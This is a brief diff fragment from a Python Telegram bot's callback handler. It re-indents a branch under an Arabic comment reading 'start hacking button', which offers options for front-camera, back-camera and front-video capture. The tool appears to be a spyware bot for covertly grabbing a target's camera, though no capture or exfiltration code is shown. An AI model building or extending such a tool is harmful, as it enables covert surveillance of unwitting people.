@@ -2242,9 +2242,9 @@ def handle_callback(call):
     
     # ====== زر "ابدأ الاختراق" ======
     # ====== زر "ابدأ الاختراق" ======
-if data == 'start_hack':
-    markup = InlineKeyboardMarkup(row_width=2)
-    markup.add(
+    if data == 'start_hack':
+        markup = InlineKeyboardMarkup(row_width=2)
+        markup.add(
         InlineKeyboardButton("📷 كاميرا أمامية", callback_data="camera_front"),
         InlineKeyboardButton("📷 كاميرا خلفية", callback_data="camera_back"),
         InlineKeyboardButton("🎥 فيديو أمامي", callback_data="video_front"),
